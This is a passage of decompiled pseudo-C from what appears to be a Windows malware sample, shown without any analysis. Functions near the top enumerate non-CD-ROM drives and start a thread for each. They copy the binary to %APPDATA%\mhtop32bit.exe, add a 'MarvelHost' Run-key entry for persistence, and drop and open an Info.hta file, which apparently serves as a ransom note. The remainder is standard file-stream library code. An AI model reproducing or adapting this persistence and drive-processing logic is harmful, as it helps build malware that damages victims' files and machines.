  GetModuleBaseNameA(CurrentProcess, 0, lpString1, 260);
  sub_402C5F();
  v3 = (const CHAR *)lpString1;
  if ( v6 >= 0x10 )
    v3 = lpString1[0];
  if ( !lstrcmpA(v3, "mhtop32bit.exe") )
    sub_403E1C();
  return unknown_libname_5(lpString1);
}
// 403DCE: conditional instruction was optimized away because %var_10.4==F
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 46B268: using guessed type int __stdcall GetModuleBaseNameA(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00403E1C) --------------------------------------------------------
char sub_403E1C()
{
  unsigned int v0; // edi
  int v1; // ecx
  int v2; // esi
  const WCHAR *v3; // eax
  int v4; // eax
  int v5; // ecx
  int (__usercall **v6)@<eax>(int@<esi>); // eax
  HANDLE CurrentThread; // eax
  char v8; // al
  unsigned int v9; // ecx
  char v11[24]; // [esp+Ch] [ebp-60h] BYREF
  void *v12[6]; // [esp+24h] [ebp-48h] BYREF
  int v13; // [esp+3Ch] [ebp-30h] BYREF
  int v14; // [esp+40h] [ebp-2Ch]
  _Thrd_t v15; // [esp+48h] [ebp-24h] BYREF
  _Thrd_t v16; // [esp+50h] [ebp-1Ch] BYREF
  int v17; // [esp+58h] [ebp-14h]
  char v18; // [esp+5Fh] [ebp-Dh] BYREF
  int v19; // [esp+68h] [ebp-4h]

  sub_40A52A(&v13);
  v19 = 0;
  v0 = 0;
  v1 = v13;
  v17 = 24;
  if ( (v14 - v13) / 24 )
  {
    v2 = 0;
    while ( 1 )
    {
      v3 = (const WCHAR *)(v2 + v1);
      if ( *(_DWORD *)(v2 + v1 + 20) >= 8u )
        v3 = *(const WCHAR **)v3;
      if ( GetDriveTypeW(v3) != 5 )
      {
        v12[4] = 0;
        v12[5] = 0;
        v18 = 1;
        sub_401EE0(v12, (_DWORD *)(v2 + v13));
        LOBYTE(v19) = 1;
        v4 = sub_405A06((int)v11, v12, &unk_47D3F4);
        LOBYTE(v19) = 2;
        sub_405AB8((uintptr_t *)&v15, (int)&v18, v4, &v18);
        unknown_libname_3(v11);
        LOBYTE(v19) = 5;
        unknown_libname_3(v12);
        sub_402C32(&v15);
        LOBYTE(v19) = 0;
        if ( v15._Id )
          break;
      }
      v1 = v13;
      ++v0;
      v2 += 24;
      if ( v0 >= (v14 - v13) / v17 )
        goto LABEL_8;
    }
LABEL_18:
    terminate(v5);
  }
LABEL_8:
  v6 = (int (__usercall **)@<eax>(int@<esi>))operator new(4u);
  v17 = (int)v6;
  *v6 = sub_403A82;
  LOBYTE(v19) = 6;
  v16._Hnd = (void *)_beginthreadex(0, 0, (_beginthreadex_proc_type)sub_406089, v6, 0, &v16._Id);
  if ( !v16._Hnd )
  {
    v16._Id = 0;
    std::_Throw_Cpp_error(6);
  }
  LOBYTE(v19) = 7;
  sub_402C32(&v16);
  do
  {
    CurrentThread = GetCurrentThread();
    WaitForSingleObject(CurrentThread, 0xAu);
    v8 = 0;
    v9 = 0;
    if ( !dword_493124 )
      break;
    do
    {
      if ( *((_BYTE *)Src + 8 * v9 + 4) == 1 )
        v8 = 1;
      ++v9;
    }
    while ( v9 < dword_493124 );
  }
  while ( v8 );
  sub_4041D1();
  if ( v16._Id )
    goto LABEL_18;
  sub_401CF5(&v13);
  return 0;
}
// 403F97: variable 'v5' is possibly undefined
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 44E1AF: using guessed type void __thiscall __noreturn terminate(_DWORD);
// 493124: using guessed type int dword_493124;

//----- (00403F9D) --------------------------------------------------------
char sub_403F9D()
{
  CHAR *v0; // eax
  const CHAR *v1; // eax
  bool v2; // bl
  HANDLE CurrentThread; // eax
  WCHAR *v4; // ecx
  CHAR String1[260]; // [esp+8h] [ebp-130h] BYREF
  HKEY hKey; // [esp+10Ch] [ebp-2Ch] BYREF
  HKEY phkResult; // [esp+110h] [ebp-28h] BYREF
  LPSTR lpFilename[4]; // [esp+114h] [ebp-24h] BYREF
  DWORD nSize; // [esp+124h] [ebp-14h]
  unsigned int v11; // [esp+128h] [ebp-10h]
  int v12; // [esp+134h] [ebp-4h]

  memset(String1, 0, sizeof(String1));
  lstrcatA(String1, " /c copy \"");
  nSize = 0;
  v11 = 15;
  LOBYTE(lpFilename[0]) = 0;
  v12 = 0;
  std::string::resize(300, 0);
  v0 = (CHAR *)lpFilename;
  if ( v11 >= 0x10 )
    v0 = lpFilename[0];
  GetModuleFileNameA(0, v0, nSize);
  v1 = (const CHAR *)lpFilename;
  if ( v11 >= 0x10 )
    v1 = lpFilename[0];
  lstrcatA(String1, v1);
  lstrcatA(String1, "\"");
  lstrcatA(String1, " \"%APPDATA%\\");
  sub_402C5F();
  lstrcatA(String1, "mhtop32bit.exe");
  lstrcatA(String1, "\"");
  ShellExecuteA(0, "open", "cmd", String1, 0, 0);
  unknown_libname_5(lpFilename);
  v2 = RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &phkResult) == 0;
  memset(String1, 0, sizeof(String1));
  lstrcatA(String1, "\"%APPDATA%\\");
  sub_402C5F();
  lstrcatA(String1, "mhtop32bit.exe");
  lstrcatA(String1, "\"");
  if ( !RegSetValueExW(phkResult, L"MarvelHost", 0, 1u, (const BYTE *)String1, 0x104u) )
    v2 = 1;
  RegCloseKey(phkResult);
  if ( v2 )
  {
    RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    RegSetValueExW(hKey, L"MarvelHost", 0, 1u, (const BYTE *)String1, 0x104u);
    RegCloseKey(hKey);
  }
  CurrentThread = GetCurrentThread();
  WaitForSingleObject(CurrentThread, 0x3E8u);
  nSize = 0;
  v11 = 7;
  LOWORD(lpFilename[0]) = 0;
  v12 = 1;
  sub_40A3CD(L"APPDATA", (WCHAR *)lpFilename);
  sub_401C17((void **)lpFilename, (void *)&word_47EA8C);
  sub_402C5F();
  sub_401C17((void **)lpFilename, L"mhtop32bit.exe");
  v4 = (WCHAR *)lpFilename;
  if ( v11 >= 8 )
    v4 = (WCHAR *)lpFilename[0];
  sub_40A37A(v4);
  unknown_libname_3(lpFilename);
  return 0;
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 47E47C: using guessed type wchar_t aMhtop32bitExe_0[15];

//----- (004041D1) --------------------------------------------------------
int sub_4041D1()
{
  CHAR *v0; // eax
  int EnvironmentVariableA; // eax
  char *v2; // eax
  const CHAR *v3; // eax
  int v5; // [esp-Ch] [ebp-FCh]
  int v6; // [esp-8h] [ebp-F8h]
  int v7; // [esp-4h] [ebp-F4h]
  int v8; // [esp+4h] [ebp-ECh]
  int v9; // [esp+8h] [ebp-E8h] BYREF
  char v10[76]; // [esp+Ch] [ebp-E4h] BYREF
  int v11; // [esp+58h] [ebp-98h]
  int v12[18]; // [esp+70h] [ebp-80h] BYREF
  int v13[2]; // [esp+B8h] [ebp-38h] BYREF
  int v14; // [esp+C0h] [ebp-30h] BYREF
  int v15; // [esp+C4h] [ebp-2Ch]
  int v16; // [esp+C8h] [ebp-28h]
  LPSTR lpBuffer[5]; // [esp+CCh] [ebp-24h] BYREF
  unsigned int v18; // [esp+E0h] [ebp-10h]
  int v19; // [esp+ECh] [ebp-4h]

  v13[0] = 0;
  v19 = 1;
  v13[1] = (int)FindResourceW(0, (LPCWSTR)0x67, (LPCWSTR)0x17);
  v14 = 0;
  v15 = 0;
  v16 = 0;
  sub_40A80C((int)v13, (int)&v14);
  lpBuffer[4] = 0;
  v18 = 15;
  LOBYTE(lpBuffer[0]) = 0;
  LOBYTE(v19) = 2;
  std::string::resize(300, 0);
  v0 = (CHAR *)lpBuffer;
  if ( v18 >= 0x10 )
    v0 = lpBuffer[0];
  EnvironmentVariableA = GetEnvironmentVariableA("APPDATA", v0, 0x12Cu);
  std::string::resize(EnvironmentVariableA, 0);
  unknown_libname_13("\\");
  unknown_libname_13("Info.hta");
  v2 = (char *)lpBuffer;
  if ( v18 >= 0x10 )
    v2 = lpBuffer[0];
  sub_4053F4(&v9, v2, v5, v6, v7);
  *(_DWORD *)&v10[*(_DWORD *)(v9 + 4) - 4] = &std::ofstream::`vftable';
  *(int *)((char *)&v8 + *(_DWORD *)(v9 + 4)) = *(_DWORD *)(v9 + 4) - 104;
  LOBYTE(v19) = 3;
  if ( v11 )
  {
    sub_404D86(&v9, v14, (unsigned int)(v15 - v14));
    if ( !sub_4053A0((int)v10) )
      sub_40584E(&v10[*(_DWORD *)(v9 + 4) - 4], v10[*(_DWORD *)(v9 + 4) + 8] | 2, 0);
    v3 = (const CHAR *)lpBuffer;
    if ( v18 >= 0x10 )
      v3 = lpBuffer[0];
    ShellExecuteA(0, "open", v3, 0, 0, 1);
  }
  sub_404D0F(v12);
  LOBYTE(v19) = 4;
  v12[0] = (int)&std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)v12);
  unknown_libname_5(lpBuffer);
  return sub_401B42((int)&v14);
}
// 404283: variable 'v5' is possibly undefined
// 404283: variable 'v6' is possibly undefined
// 404283: variable 'v7' is possibly undefined
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 46EC10: using guessed type void *std::ios_base::`vftable';
// 47EA30: using guessed type void *std::ofstream::`vftable';
// 4041D1: using guessed type char var_E4[76];

//----- (00404355) --------------------------------------------------------
void __thiscall sub_404355(_DWORD *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 26);
  sub_404D0F(this + 26);
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 46EC10: using guessed type void *std::ios_base::`vftable';

//----- (00404396) --------------------------------------------------------
int __thiscall sub_404396(_DWORD *this, std::locale *a2)
{
  struct std::_Facet_base *v3; // eax

  v3 = sub_405B4E(a2);
  return sub_40527B(this, (int)v3);
}

//----- (004043B2) --------------------------------------------------------
int __thiscall sub_4043B2(FILE **this)
{
  if ( !this[19] || ((int (__thiscall *)(FILE **, int))(*this)->_flag)(this, -1) == -1 || fflush(this[19]) >= 0 )
    return 0;
  else
    return -1;
}

//----- (0040442B) --------------------------------------------------------
_DWORD *__thiscall sub_40442B(int this, _DWORD *a2, __int64 a3, __int64 a4, int a5, int a6, int a7)
{
  _DWORD *result; // eax
  fpos_t Position; // [esp+8h] [ebp-8h] BYREF

  Position = a4 + a3;
  if ( *(_DWORD *)(this + 76) && sub_4052A6((void *)this) && !fsetpos(*(FILE **)(this + 76), &Position) )
  {
    *(_DWORD *)(this + 64) = a5;
    *(_DWORD *)(this + 68) = a6;
    std::filebuf::_Reset_back(this);
    std::fpos<_Mbstatet>::fpos<_Mbstatet>(*(_DWORD *)(this + 64), *(_DWORD *)(this + 68), Position, HIDWORD(Position));
    return a2;
  }
  else
  {
    result = a2;
    *a2 = -1;
    a2[1] = -1;
    a2[2] = 0;
    a2[3] = 0;
    a2[4] = 0;
    a2[5] = 0;
  }
  return result;
}
// 4051FD: using guessed type _DWORD __stdcall std::fpos<_Mbstatet>::fpos<_Mbstatet>(_DWORD, _DWORD, _DWORD, _DWORD);
// 405258: using guessed type int __thiscall std::filebuf::_Reset_back(_DWORD);

//----- (004044B0) --------------------------------------------------------
_DWORD *__thiscall sub_4044B0(int this, _DWORD *a2, fpos_t Position, int Origin, int a5)
{
  unsigned int v6; // ebx
  unsigned int v7; // edi
  _DWORD *result; // eax

  if ( **(_DWORD **)(this + 28) == this + 60 && Origin == 1 && !*(_DWORD *)(this + 56) )
  {
    v6 = (unsigned __int64)(Position - 1) >> 32;
    v7 = Position - 1;
  }
  else
  {
    v6 = HIDWORD(Position);
    v7 = Position;
  }
  if ( !*(_DWORD *)(this + 76)
    || !sub_4052A6((void *)this)
    || (v6 | v7 || Origin != 1) && _fseeki64(*(FILE **)(this + 76), __SPAIR64__(v6, v7), Origin)
    || fgetpos(*(FILE **)(this + 76), &Position) )
  {
    result = a2;
    *a2 = -1;
    a2[1] = -1;
    a2[2] = 0;
    a2[3] = 0;
    a2[4] = 0;
    a2[5] = 0;
  }
  else
  {
    std::filebuf::_Reset_back(this);
    std::fpos<_Mbstatet>::fpos<_Mbstatet>(*(_DWORD *)(this + 64), *(_DWORD *)(this + 68), Position, HIDWORD(Position));
    return a2;
  }
  return result;
}
// 4051FD: using guessed type _DWORD __stdcall std::fpos<_Mbstatet>::fpos<_Mbstatet>(_DWORD, _DWORD, _DWORD, _DWORD);
// 405258: using guessed type int __thiscall std::filebuf::_Reset_back(_DWORD);

//----- (00404564) --------------------------------------------------------
unsigned __int64 __thiscall sub_404564(int this, unsigned __int8 *Src, __int64 a3)
{
  unsigned int v5; // edi
  size_t v6; // esi
  signed int v7; // eax
  int v8; // ecx
  unsigned __int8 *v9; // eax
  unsigned __int64 v10; // kr10_8
  __int64 v11; // [esp+Ch] [ebp-14h]
  void *v12; // [esp+14h] [ebp-Ch]

  if ( *(_DWORD *)(this + 56) )
    return sub_404B23((_DWORD **)this, Src, a3);
  v5 = HIDWORD(a3);
  v6 = a3;
  v12 = **(void ***)(this + 32);
  if ( v12 )
    v7 = **(_DWORD **)(this + 48);
  else
    v7 = 0;
  v11 = v7;
  v8 = v7 >> 31;
  if ( a3 > 0 )
  {
    if ( v8 >= 0 && (v8 > 0 || v7) )
    {
      if ( a3 < v7 )
      {
        v7 = a3;
        v11 = a3;
      }
      memmove_0(v12, Src, v7);
      v5 = (unsigned __int64)(a3 - v11) >> 32;
      v6 = a3 - v11;
      **(_DWORD **)(this + 48) -= v11;
      **(_DWORD **)(this + 32) += v11;
      v9 = &Src[v11];
      if ( a3 - v11 <= 0 )
        return a3 - __PAIR64__(v5, v6);
    }
    else
    {
      v9 = Src;
    }
    if ( *(_DWORD *)(this + 76) )
    {
      v10 = __PAIR64__(v5, v6) - fwrite(v9, 1u, v6, *(FILE **)(this + 76));
      v5 = HIDWORD(v10);
      v6 = v10;
    }
  }
  return a3 - __PAIR64__(v5, v6);
}

//----- (00404649) --------------------------------------------------------
int __thiscall sub_404649(int this, char *Buffer, __int64 a3)
{
  const void *v5; // ecx
  size_t *v6; // eax
  size_t v7; // esi
  char *v8; // ecx
  size_t v9; // eax
  size_t v10; // edx
  unsigned int v12; // ecx
  unsigned int v13; // [esp+Ch] [ebp-8h]
  size_t v14; // [esp+10h] [ebp-4h]
  unsigned int v15; // [esp+24h] [ebp+10h]

  if ( a3 <= 0 )
    return 0;
  if ( *(_DWORD *)(this + 56) )
    return sub_404BEA((_DWORD **)this, Buffer, a3);
  v14 = a3;
  v13 = a3;
  v5 = **(const void ***)(this + 28);
  if ( v5 )
  {
    v6 = *(size_t **)(this + 44);
    if ( *v6 )
    {
      v7 = a3;
      if ( *v6 < (unsigned int)a3 )
        v7 = *v6;
      memmove_0(Buffer, v5, v7);
      Buffer += v7;
      v14 = a3 - v7;
      v13 = a3 - v7;
      **(_DWORD **)(this + 44) -= v7;
      **(_DWORD **)(this + 28) += v7;
    }
  }
  if ( *(_DWORD *)(this + 76) )
  {
    std::filebuf::_Reset_back(this);
    v15 = v13;
    if ( v13 > 0xFFF )
    {
      v8 = Buffer;
      while ( 1 )
      {
        v9 = fread(v8, 1u, 0xFFFu, *(FILE **)(this + 76));
        v8 = &Buffer[v9];
        v10 = v14 - v9;
        Buffer += v9;
        v14 = v10;
        v15 = v10;
        if ( v9 != 4095 )
          return a3 - v10;
        if ( v10 <= 0xFFF )
          goto LABEL_18;
      }
    }
    v10 = v14;
LABEL_18:
    v12 = v15;
    if ( v15 )
      v12 = v15 - fread(Buffer, 1u, v10, *(FILE **)(this + 76));
  }
  else
  {
    v12 = v13;
  }
  return a3 - v12;
}
// 405258: using guessed type int __thiscall std::filebuf::_Reset_back(_DWORD);

//----- (0040475B) --------------------------------------------------------
int __thiscall sub_40475B(int this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // edx
  _DWORD *v4; // ecx
  unsigned __int8 *v5; // edx
  FILE *v7; // eax
  int v8; // eax
  int v9; // ebx
  void **v10; // ecx
  void **v11; // esi
  int v12; // eax
  void **v13; // ecx
  void **v14; // eax
  int v15; // ecx
  int v16; // esi
  void **v17; // eax
  void *v18[4]; // [esp+8h] [ebp-30h] BYREF
  int v19; // [esp+18h] [ebp-20h]
  unsigned int v20; // [esp+1Ch] [ebp-1Ch]
  unsigned __int8 *v21; // [esp+20h] [ebp-18h] BYREF
  int v22; // [esp+24h] [ebp-14h] BYREF
  unsigned __int8 v23; // [esp+2Ah] [ebp-Eh] BYREF
  unsigned __int8 v24; // [esp+2Bh] [ebp-Dh] BYREF
  _DWORD v25[3]; // [esp+2Ch] [ebp-Ch] BYREF

  v2 = **(_DWORD **)(this + 28);
  if ( v2 )
  {
    v3 = *(_DWORD **)(this + 44);
    if ( v2 < *v3 + v2 )
    {
      --*v3;
      v4 = *(_DWORD **)(this + 28);
      v5 = (unsigned __int8 *)(*v4)++;
      return *v5;
    }
  }
  if ( !*(_DWORD *)(this + 76) )
    return -1;
  std::filebuf::_Reset_back(this);
  v7 = *(FILE **)(this + 76);
  if ( !*(_DWORD *)(this + 56) )
  {
    if ( (unsigned __int8)std::_Fgetc<char>((int)&v23, *(FILE **)(this + 76)) )
      return v23;
    return -1;
  }
  v19 = 0;
  v20 = 15;
  LOBYTE(v18[0]) = 0;
  v25[2] = 0;
  v8 = fgetc(v7);
  v9 = -1;
  while ( v8 != -1 )
  {
    sub_4054F8(v18, v8);
    v10 = v18;
    v11 = v18;
    if ( v20 >= 0x10 )
    {
      v10 = (void **)v18[0];
      v11 = (void **)v18[0];
    }
    v12 = (*(int (__thiscall **)(_DWORD, int, void **, int, int *, unsigned __int8 *, _DWORD *, unsigned __int8 **))(**(_DWORD **)(this + 56) + 24))(
            *(_DWORD *)(this + 56),
            this + 64,
            v11,
            (int)v10 + v19,
            &v22,
            &v24,
            v25,
            &v21);
    if ( v12 < 0 )
      break;
    if ( v12 > 1 )
    {
      if ( v12 == 3 )
      {
        v17 = v18;
        if ( v20 >= 0x10 )
          v17 = (void **)v18[0];
        v9 = *(char *)v17;
      }
      break;
    }
    if ( v21 != &v24 )
    {
      v14 = v18;
      if ( v20 >= 0x10 )
        v14 = (void **)v18[0];
      v15 = v22;
      v16 = (int)v14 + v19 - v22;
      if ( v16 > 0 )
      {
        while ( 1 )
        {
          ungetc(*(char *)(--v16 + v15), *(FILE **)(this + 76));
          if ( v16 <= 0 )
            break;
          v15 = v22;
        }
      }
      v9 = v24;
      break;
    }
    v13 = v18;
    if ( v20 >= 0x10 )
      v13 = (void **)v18[0];
    sub_404EE7(v18, 0, v22 - (_DWORD)v13);
    v8 = fgetc(*(FILE **)(this + 76));
  }
  unknown_libname_5(v18);
  return v9;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 405258: using guessed type int __thiscall std::filebuf::_Reset_back(_DWORD);
// 40475B: using guessed type int var_14;

//----- (004048CF) --------------------------------------------------------
int __thiscall sub_4048CF(_DWORD **this)
{
  unsigned __int8 *v2; // ecx
  int result; // eax
  int v4; // edi

  v2 = (unsigned __int8 *)*this[7];
  if ( v2 && v2 < &v2[*this[11]] )
    return *v2;
  v4 = ((int (__thiscall *)(_DWORD **))(*this)[7])(this);
  result = -1;
  if ( v4 != -1 )
  {
    ((void (__thiscall *)(_DWORD **, int))(*this)[4])(this, v4);
    return v4;
  }
  return result;
}

//----- (00404909) --------------------------------------------------------
int __thiscall sub_404909(int this, int a2)
{
  int v2; // ebx
  unsigned int v4; // ecx

  v2 = a2;
  v4 = **(_DWORD **)(this + 28);
  if ( v4 && **(_DWORD **)(this + 12) < v4 && (a2 == -1 || *(unsigned __int8 *)(v4 - 1) == a2) )
  {
    ++**(_DWORD **)(this + 44);
    --**(_DWORD **)(this + 28);
    if ( a2 == -1 )
      return 0;
    return v2;
  }
  if ( *(_DWORD *)(this + 76) && a2 != -1 )
  {
    if ( !*(_DWORD *)(this + 56) && ungetc((unsigned __int8)a2, *(FILE **)(this + 76)) != -1 )
      return v2;
    if ( **(_DWORD **)(this + 28) != this + 60 )
    {
      *(_BYTE *)(this + 60) = a2;
      std::filebuf::_Set_back(this);
      return v2;
    }
  }
  return -1;
}
// 405225: using guessed type int __thiscall std::filebuf::_Set_back(_DWORD);

//----- (00404988) --------------------------------------------------------
int __thiscall sub_404988(int this, char *a2)
{
  char *v2; // ebx
  int v3; // edi
  int result; // eax
  unsigned int v6; // ecx
  _DWORD *v7; // edx
  _DWORD *v8; // edx
  _BYTE *v9; // esi
  int v10; // ecx
  char v11; // al
  int v12; // eax
  size_t v13; // eax
  char Buffer[32]; // [esp+Ch] [ebp-2Ch] BYREF
  char *v15; // [esp+2Ch] [ebp-Ch] BYREF
  int v16; // [esp+30h] [ebp-8h]
  char v17; // [esp+34h] [ebp-4h] BYREF
  _BYTE v18[3]; // [esp+35h] [ebp-3h] BYREF

  v2 = a2;
  v3 = -1;
  if ( a2 == (char *)-1 )
    return 0;
  v6 = **(_DWORD **)(this + 32);
  if ( v6 )
  {
    v7 = *(_DWORD **)(this + 48);
    if ( v6 < v6 + *v7 )
    {
      --*v7;
      result = (int)v2;
      v8 = *(_DWORD **)(this + 32);
      v9 = (_BYTE *)(*v8)++;
      *v9 = (_BYTE)v2;
      return result;
    }
  }
  if ( !*(_DWORD *)(this + 76) )
    return v3;
  std::filebuf::_Reset_back(this);
  v10 = *(_DWORD *)(this + 56);
  if ( !v10 )
  {
    v11 = std::_Fputc<char>((char)v2, *(FILE **)(this + 76));
    goto LABEL_9;
  }
  v17 = (char)v2;
  v12 = (*(int (__thiscall **)(int, int, char *, _BYTE *, char **, char *, char **, char **))(*(_DWORD *)v10 + 28))(
          v10,
          this + 64,
          &v17,
          v18,
          &v15,
          Buffer,
          &v15,
          &a2);
  if ( v12 < 0 )
    return v3;
  if ( v12 > 1 )
  {
    if ( v12 == 3 )
    {
      v11 = std::_Fputc<char>(v17, *(FILE **)(this + 76));
LABEL_9:
      if ( v11 )
        return (int)v2;
      return v3;
    }
    return v3;
  }
  v16 = a2 - Buffer;
  if ( a2 != Buffer )
  {
    v13 = fwrite(Buffer, 1u, a2 - Buffer, *(FILE **)(this + 76));
    if ( v16 != v13 )
      return v3;
  }
  *(_BYTE *)(this + 61) = 1;
  result = (int)v2;
  if ( v15 == &v17 )
    return v3;
  return result;
}
// 405258: using guessed type int __thiscall std::filebuf::_Reset_back(_DWORD);

//----- (00404A8D) --------------------------------------------------------
void __thiscall sub_404A8D(int this)
{
  bool v2; // zf

  v2 = *(_DWORD *)(this + 76) == 0;
  *(_DWORD *)this = &std::filebuf::`vftable';
  if ( !v2 )
    std::filebuf::_Reset_back(this);
  if ( *(_BYTE *)(this + 72) )
    sub_4053A0(this);
  sub_404CEE((_DWORD *)this);
}
// 405258: using guessed type int __thiscall std::filebuf::_Reset_back(_DWORD);
// 46EC58: using guessed type void *std::filebuf::`vftable';

//----- (00404ADD) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (00404AE0) --------------------------------------------------------
void *__thiscall sub_404AE0(void *this, int a2, int a3, int a4)
{
  return this;
}

//----- (00404B23) --------------------------------------------------------
unsigned __int64 __thiscall sub_404B23(_DWORD **this, unsigned __int8 *Src, __int64 a3)
{
  __int64 v3; // rax
  int v4; // edi
  size_t v5; // esi
  int v8; // eax
  size_t v9; // ebx
  int v10; // eax
  void *v12; // [esp+14h] [ebp-8h]
  _DWORD **v13; // [esp+18h] [ebp-4h]
  int v14; // [esp+2Ch] [ebp+10h]

  v4 = HIDWORD(a3);
  v5 = a3;
  v3 = a3;
  v13 = this;
  if ( a3 > 0 )
  {
    do
    {
      v12 = (void *)*this[8];
      if ( v12 )
        v8 = *this[12];
      else
        v8 = 0;
      v9 = v8;
      v10 = v8 >> 31;
      v14 = v10;
      if ( __SPAIR64__(v10, v9) <= 0 )
      {
        if ( ((int (__thiscall *)(_DWORD **, _DWORD))(*this)[3])(this, *Src) == -1 )
          break;
        this = v13;
        v4 = (__PAIR64__(v4, v5--) - 1) >> 32;
        v9 = 1;
      }
      else
      {
        if ( v4 <= v10 && (v4 < v10 || v5 < v9) )
        {
          v9 = v5;
          v14 = v4;
        }
        memmove_0(v12, Src, v9);
        this = v13;
        v4 = (__PAIR64__(v4, v5) - __PAIR64__(v14, v9)) >> 32;
        v5 -= v9;
        *v13[12] -= v9;
        *v13[8] += v9;
      }
      Src += v9;
    }
    while ( v4 > 0 || v4 >= 0 && v5 );
    v3 = a3;
  }
  return v3 - __PAIR64__(v4, v5);
}

//----- (00404BEA) --------------------------------------------------------
unsigned __int64 __thiscall sub_404BEA(_DWORD **this, _BYTE *a2, __int64 a3)
{
  __int64 v3; // rax
  int v4; // edi
  size_t v5; // esi
  int v8; // eax
  size_t v9; // ebx
  int v10; // eax
  _BYTE *v11; // eax
  int v12; // eax
  char v13; // cl
  void *Src; // [esp+10h] [ebp-8h]
  _DWORD **v16; // [esp+14h] [ebp-4h]
  int v17; // [esp+28h] [ebp+10h]

  v4 = HIDWORD(a3);
  v5 = a3;
  v3 = a3;
  v16 = this;
  if ( a3 > 0 )
  {
    do
    {
      Src = (void *)*this[7];
      if ( Src )
        v8 = *this[11];
      else
        v8 = 0;
      v9 = v8;
      v10 = v8 >> 31;
      v17 = v10;
      if ( __SPAIR64__(v10, v9) <= 0 )
      {
        v12 = ((int (__thiscall *)(_DWORD **))(*this)[7])(this);
        v13 = v12;
        if ( v12 == -1 )
          break;
        v11 = a2;
        v4 = (__PAIR64__(v4, v5--) - 1) >> 32;
        v9 = 1;
        *a2 = v13;
        this = v16;
      }
      else
      {
        if ( v4 <= v10 && (v4 < v10 || v5 < v9) )
        {
          v9 = v5;
          v17 = v4;
        }
        memmove_0(a2, Src, v9);
        this = v16;
        v4 = (__PAIR64__(v4, v5) - __PAIR64__(v17, v9)) >> 32;
        v5 -= v9;
        *v16[11] -= v9;
        *v16[7] += v9;
        v11 = a2;
      }
      a2 = &v11[v9];
    }
    while ( v4 > 0 || v4 >= 0 && v5 );
    v3 = a3;
  }
  return v3 - __PAIR64__(v4, v5);
}

//----- (00404CB9) --------------------------------------------------------
int __thiscall sub_404CB9(_DWORD **this)
{
  int v2; // eax
  int v3; // ecx
  _DWORD *v4; // ecx
  unsigned __int8 *v5; // edx

  v2 = ((int (__thiscall *)(_DWORD **))(*this)[6])(this);
  v3 = -1;
  if ( v2 != -1 )
  {
    --*this[11];
    v4 = this[7];
    v5 = (unsigned __int8 *)(*v4)++;
    return *v5;
  }
  return v3;
}

//----- (00404CDE) --------------------------------------------------------
int sub_404CDE()
{
  return -1;
}

//----- (00404CE2) --------------------------------------------------------
__int64 sub_404CE2()
{
  return 0i64;
}

//----- (00404CE7) --------------------------------------------------------
int __stdcall sub_404CE7(int a1)
{
  return -1;
}

//----- (00404CEE) --------------------------------------------------------
void __thiscall sub_404CEE(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = (_DWORD *)this[13];
  *this = &std::streambuf::`vftable';
  if ( v1 )
  {
    sub_4032B2(v1);
    sub_42CF7C(v1);
  }
}
// 46EC18: using guessed type void *std::streambuf::`vftable';

//----- (00404D0F) --------------------------------------------------------
int __thiscall sub_404D0F(_DWORD *this)
{
  int v2; // ecx
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 26) + 4) - 104) = &std::ofstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 26) + 4) - 108) = *(_DWORD *)(*(this - 26) + 4) - 104;
  sub_404A8D((int)(this - 25));
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 26) + 4) - 104) = &std::ostream::`vftable';
  v2 = *(_DWORD *)(*(this - 26) + 4);
  result = v2 - 8;
  *(_DWORD *)((char *)this + v2 - 108) = v2 - 8;
  return result;
}
// 46ECA0: using guessed type void *std::ostream::`vftable';
// 47EA30: using guessed type void *std::ofstream::`vftable';

//----- (00404D52) --------------------------------------------------------
char *__thiscall sub_404D52(void *this, _DWORD *a2)
{
  _DWORD *v2; // edx
  char *result; // eax

  v2 = dword_493130;
  if ( dword_493130 == (void *)dword_493134 )
    return sub_405BE3(this, dword_493130, a2);
  *(_DWORD *)dword_493130 = *a2;
  result = (char *)a2[1];
  v2[1] = result;
  dword_493130 = (char *)dword_493130 + 8;
  return result;
}
// 493134: using guessed type int dword_493134;

//----- (00404D86) --------------------------------------------------------
_BYTE *__thiscall sub_404D86(_BYTE *this, int a2, __int64 a3)
{
  char v4; // di
  int v5; // ecx
  int v6; // edx
  int v8; // [esp+0h] [ebp-2Ch] BYREF
  int *v9; // [esp+Ch] [ebp-20h] BYREF
  char v10; // [esp+10h] [ebp-1Ch]
  int v11; // [esp+14h] [ebp-18h]
  _BYTE *v12; // [esp+18h] [ebp-14h]
  int *v13; // [esp+1Ch] [ebp-10h]
  int v14; // [esp+28h] [ebp-4h]

  v13 = &v8;
  v4 = 0;
  v12 = this;
  v11 = 0;
  sub_405156((int)&v9, (int)this);
  v14 = 0;
  if ( v10 )
  {
    if ( a3 > 0 )
    {
      LOBYTE(v14) = 1;
      v5 = *(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56];
      if ( (*(int (__thiscall **)(int, int, _DWORD, _DWORD))(*(_DWORD *)v5 + 36))(v5, a2, a3, HIDWORD(a3)) != (_DWORD)a3
        || v6 != HIDWORD(a3) )
      {
        v4 = 4;
      }
      v14 = 0;
    }
  }
  else
  {
    v4 = 4;
  }
  sub_40584E(&this[*(_DWORD *)(*(_DWORD *)this + 4)], v4 | this[*(_DWORD *)(*(_DWORD *)this + 4) + 12], 0);
  sub_405117(&v9);
  return this;
}
